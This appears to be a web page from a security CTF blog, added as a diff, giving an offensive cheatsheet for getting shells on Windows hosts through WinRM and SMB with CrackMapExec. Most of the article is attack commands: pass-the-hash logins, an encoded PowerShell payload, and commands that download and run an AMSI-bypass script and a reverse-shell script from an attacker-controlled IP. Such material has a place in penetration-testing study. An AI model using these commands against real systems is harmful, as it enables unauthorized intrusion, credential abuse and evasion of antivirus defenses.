@@ -1,0 +1,55 @@
+<head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Login through CIFS/WinRM/PSSession</title><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></head><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
+|
+<a href=https://ceso.github.io/whoami/><b>Whoami</b></a>
+|
+<a href=https://ceso.github.io/posts/><b>Posts</b></a>
+|
+<a href=https://ceso.github.io/cheatsheets/><b>Cheatsheets</b></a>
+|
+<a href=https://ceso.github.io/resources><b>Resources</b></a>
+|
+<a href=https://ceso.github.io/videos><b>Videos</b></a>
+|
+<a href=https://ceso.github.io/categories/><b>Categories</b></a>
+|
+<a href=https://ceso.github.io/tags/><b>Tags</b></a>
+|
+<a href=https://ceso.github.io/index.xml><b>RSS</b></a></nav><hr></header><div class=wrap><nav class=sidebar aria-label="Table of contents"><h2>Cheatsheets</h2><details open><summary>Hacking</summary><div class=children><details><summary>Active Directory</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/>BloodHound
+</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/>Exploitation
+</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/>Permissions: ACE/SDDL - Format
+</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/>PowerView - methods for enumeration</a></div></details><details><summary>Antivirus Bypassing</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/readme/>README !
+</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/amsi/>AMSI
+</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/signature_heuristics/>Signature/Heuristics</a></div></details><details open><summary>Enumeration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/ class=current>Login through CIFS/WinRM/PSSession
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/networking/>Networking
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/samba/>Samba
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/>Useful Wordlists
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/>Web directorie/file scanner
+</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/windows/>Windows</a></div></details><details><summary>Exfiltration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/ftp/>FTP
+</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/http/>HTTP
+</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/rdp/>RDP
+</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/samba/>Samba
+</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/sockets/>Sockets</a></div></details><details><summary>Good to know</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/>Compiling
+</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/>Misc
+</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/web/>Web</a></div></details><details><summary>Memory Exploitation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/memory_exploitation/simple_buffer_overflow/>(Simple) Buffer Overflow (32 bits, NO ASLR and NO DEP)</a></div></details><details><summary>Pivoting</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/readme/>README !
+</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/chisel/>Chisel
+</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/metasploit/>Metasploit
+</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/>sshuttle</a></div></details><details><summary>Privilege Escalation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/>Linux
+</a><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/>Windows</a></div></details><details><summary>Reverse Shells</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/>Bash
+</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/>Metasploit
+</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr style="border:none;border-top:1px solid rgba(255,255,255,3%);margin:12px 0"><div style=padding:8px;color:#9aa4b2;font-size:13px>I wuv cheese :D</div></nav><main><header class=page-title><h1>Login through CIFS/WinRM/PSSession</h1></header><article><p>When injecting a ticket and impersonating a user, we can swap <code>CIFS</code> for <code>HTTP</code> for getting a shell via WinRM or swap <code>CIFS</code> for <code>HOST</code> for getting a shell via PsExec!!!</p><hr><h1 id=crackmapexec---winrm>CrackMapExec - WinRM</h1><p>With Hash</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>crackmapexec winrm 172.16.80.24 -u administrator -H 09238831b1af5edab93c773f56409d96 -x &#34;ipconfig&#34;
+</span></span></code></pre></div><p>With Password (Example gets a reverse shell)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>crackmapexec winrm 172.16.80.24 -u brie -p fn89hudi1892r -x &#34;powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgAxADAANwAvAG4AaQBlAHIAaQAuAHAAcwAxACIAKQA7AEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAwADcALwByAHUAbgAtAHMAaABlAGwAbABjAG8AZABlAC0ANgA0AGIAaQB0AHMALgBwAHMAMQAiACkACgA=&#34;
+</span></span></code></pre></div><hr><h1 id=crackmapexec---smb>CrackMapExec - SMB</h1><p>With Hash</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>crackmapexec smb 172.16.21.22 -u gouda -H 09238831b1af5edab93c773f56409d96 -x &#34;powershell.exe IEX(New-Object Net.Webclient).downloadString(&#39;http://192.168.42.42/4msibyp455.ps1&#39;);IEX(New-Object Net.Webclient).downloadString(&#39;http://192.168.42.42/dameelreversooo.ps1&#39;)&#34;
+</span></span></code></pre></div><p>With Hash + Domain</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>crackmapexec smb 172.16.21.22 -d example.com -u cuartirolo -H 09238831b1af5edab93c773f56409d96 -x &#34;whoami&#34;
+</span></span></code></pre></div><p>With password</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>smb 172.16.21.22 -u administrator -p fn89hudi1892r -x &#34;powershell.exe IEX(New-Object Net.Webclient).downloadString(&#39;http://192.168.42.42/dameelreversooo.ps1&#39;)&#34;
+</span></span></code></pre></div><hr><h1 id=version-nmap-didnt-detect-it>Version (nmap didn&rsquo;t detect it)</h1><p>Sometimes nmap doesn&rsquo;t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.</p><img src=https://ceso.github.io/images/cheatsheet/smb-version-wireshark.png class=center style=border-radius:8px><hr></article></main></div></body><footer><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></footer><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank>GitHub</a>
+|
+<a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
+|
+<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2025
+<a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
+<a href=http://www.gohugo.io/>Hugo</a> by ceso,
+using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
+<a href=https://github.com/joe-mccarthy/smigle-lite>smigle-lite</a>. Based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>,
+which was influenced by the theme
+<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer>
